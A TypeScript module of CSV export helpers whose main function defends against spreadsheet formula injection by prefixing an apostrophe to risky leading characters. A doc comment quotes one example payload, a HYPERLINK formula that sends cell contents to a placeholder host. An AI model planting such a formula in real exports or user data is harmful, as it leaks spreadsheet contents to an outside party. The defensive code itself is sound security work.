/**
 * CSV export helpers.
 *
 * The three exporters in History, Bulk Test, and Settings each had their own
 * copy of the same quoting logic. That meant the quoting fix had to be applied
 * in three places, and a fix applied to only one of them would have left the
 * others vulnerable.
 */

/**
 * Neutralises spreadsheet formula injection.
 *
 * Wrapping a value in double quotes does not stop Excel, Google Sheets, or
 * LibreOffice from evaluating a cell whose text begins with `=`, `+`, `-`, or
 * `@`. A nickname or a note is user controlled and is exported verbatim, so a
 * stored value such as `=HYPERLINK("https://example.invalid/leak?"&A1,"x")`
 * would otherwise execute when the exported file is opened.
 *
 * A leading apostrophe is prepended, which spreadsheets treat as "this cell is
 * literal text". The apostrophe is not displayed and is not part of the value
 * the user typed. The check is limited to the first character because a `=`
 * anywhere else in a cell is inert.
 */
export function escapeCsvValue(value: unknown): string {
  if (value === null || value === undefined) return '""';
  const text = String(value);
  const guarded = /^[=+\-@\t\r]/.test(text) ? `'${text}` : text;
  return `"${guarded.replace(/"/g, '""')}"`;
}

/** Joins already escaped rows into CSV text, one row per line. */
export function toCsv(rows: readonly (readonly unknown[])[]): string {
  return rows.map((row) => row.map(escapeCsvValue).join(",")).join("\r\n");
}

/**
 * Builds a complete CSV file body.
 *
 * A UTF-8 byte order mark is prepended so spreadsheet software detects UTF-8 and
 * renders non-ASCII nicknames correctly instead of showing replacement
 * characters.
 */
export function buildCsv(filenameBase: string, rows: readonly (readonly unknown[])[]): {
  filename: string;
  content: string;
} {
  const stamp = new Date().toISOString().slice(0, 10);
  return {
    filename: `${filenameBase}-${stamp}.csv`,
    content: `\uFEFF${toCsv(rows)}\r\n`,
  };
}

/** Triggers a browser download for the given text content. */
export function downloadTextFile(filename: string, content: string, mimeType: string): void {
  const blob = new Blob([content], { type: `${mimeType};charset=utf-8` });
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.href = url;
  link.download = filename;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  URL.revokeObjectURL(url);
}

/** Downloads rows as a CSV file. */
export function downloadCsv(filenameBase: string, rows: readonly (readonly unknown[])[]): string {
  const { filename, content } = buildCsv(filenameBase, rows);
  downloadTextFile(filename, content, "text/csv");
  return filename;
}
